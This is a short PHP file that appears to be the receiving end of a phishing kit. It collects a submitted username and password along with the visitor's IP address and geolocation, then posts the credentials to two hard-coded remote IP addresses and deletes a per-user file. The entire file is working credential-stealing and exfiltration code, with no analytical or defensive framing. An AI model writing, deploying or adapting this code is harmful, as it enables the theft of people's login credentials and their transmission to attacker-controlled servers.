<?php
header("Access-Control-Allow-Origin: *");
require 'call.php';
require 'location.php';
$ip = getUserIP();
$hostname = gethostbyaddr(@$_SERVER['REMOTE_ADDR']);
$browser = @$_SERVER['HTTP_USER_AGENT'];
$geo = unserialize(file_get_contents("http://www.geoplugin.net/php.gp?ip=$hostname"));
$country = $geo["geoplugin_countryName"];
$city = $geo["geoplugin_city"];
$region = $geo["geoplugin_region"];

$post = json_decode(file_get_contents('php://input'), true);


$info =
    "--------- Login.info -----------" . "\r\n" .
    "User: " . $post['username'] . "\r\n" .
    "Pass: " . $post['password'] . "\r\n" .
    "IP: " . $ip . "\r\n" .
    "-" .
    "--------- Login -----------" . "\r\n";

$url = 'http://63.141.248.148:22';
$data = array('info' => $info);
// use key 'http' even if you send the request to https://...
$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);
$context = stream_context_create($options);
$result = file_get_contents($url, false, $context);
if ($result === FALSE) { /* Handle error */
}


$url2 = 'http://107.175.34.149:22';
$data = array('info' => $info);
// use key 'http' even if you send the request to https://...
$options = array(
    'http' => array(
        'header' => "Content-type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data)
    )
);
$context = stream_context_create($options);
$result = file_get_contents($url2, false, $context);
if ($result === FALSE) { /* Handle error */
}


if (file_exists($post['username'] . '.txt')) {
    unlink($post['username'] . '.txt');
    echo 'deleted';
}

